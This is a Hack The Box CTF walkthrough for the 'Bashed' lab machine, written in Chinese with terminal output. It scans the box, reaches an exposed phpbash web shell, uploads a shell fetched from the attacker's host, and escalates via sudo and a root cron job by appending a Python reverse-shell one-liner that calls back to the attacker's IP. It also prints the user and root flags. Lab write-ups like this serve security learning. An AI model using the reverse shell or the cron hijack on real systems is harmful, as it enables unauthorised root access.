###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Bashed

```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.39.150 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.39.150:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
```

在首頁有提到`phpbash`的東東，透過掃描目錄可得到`http://10.129.39.150/dev/phpbash.php`
```
┌──(kali㉿kali)-[~/htb]
└─$ feroxbuster -u http://10.129.39.150 -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

301      GET        9l       28w      312c http://10.129.39.150/dev => http://10.129.39.150/dev/
200      GET      216l      489w     8151c http://10.129.39.150/dev/phpbash.php
200      GET        1l      255w     4559c http://10.129.39.150/dev/phpbash.min.php

Scans:
  0: running      http://10.129.39.150/
  1: complete     http://10.129.39.150/images/
  9: running      http://10.129.39.150/uploads/
 12: complete     http://10.129.39.150/css/
 14: complete     http://10.129.39.150/js/
 22: complete     http://10.129.39.150/php/
 30: complete     http://10.129.39.150/dev/
 33: complete     http://10.129.39.150/fonts/
```

前往`http://10.129.39.150/dev/phpbash.php`
在`/home/arrexel`可得user.txt
```
www-data@bashed
:/home/arrexel# cat user.txt

d55bb57779dde9decc1b235280d39504
```

可在`/var/www/html/uploads`上傳shell.php開nc反彈
```
www-data@bashed:/var/www/html/uploads# wget 10.10.14.55/shell.php

┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

透過`sudo -l`可以查看到可以用`scriptmanager`的身分執行指令
```
www-data@bashed:/home/scriptmanager# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

利用`sudo -u`切換
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo -h 

-u, --user=user    run command (or edit file) as specified username or ID

www-data@bashed:/tmp$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/tmp$
```

利用`pspy`
```
scriptmanager@bashed:/tmp$ wget 10.10.14.55/pspy64
scriptmanager@bashed:/tmp$ chmod +x pspy64
scriptmanager@bashed:/tmp$ ./pspy64 

2024/08/26 00:36:41 CMD: UID=0     PID=1      | /sbin/init noprompt 
2024/08/26 00:37:01 CMD: UID=0     PID=64054  | python test.py 
2024/08/26 00:37:01 CMD: UID=0     PID=64053  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2024/08/26 00:37:01 CMD: UID=0     PID=64052  | /usr/sbin/CRON -f 
2024/08/26 00:38:01 CMD: UID=0     PID=64057  | python test.py 
2024/08/26 00:38:01 CMD: UID=0     PID=64056  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
```

發現會一直執行`test.py`，加reverseshell進來
``` python
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4445

scriptmanager@bashed:/scripts$ echo 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.55",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")' >> test.py

scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
import os,pty,socket;s=socket.socket();s.connect(("10.10.14.55",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")
```

得root可在/root得root.txt
```
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@bashed:~# cat root.txt
75add60109b4916a7219ef18769638db
```
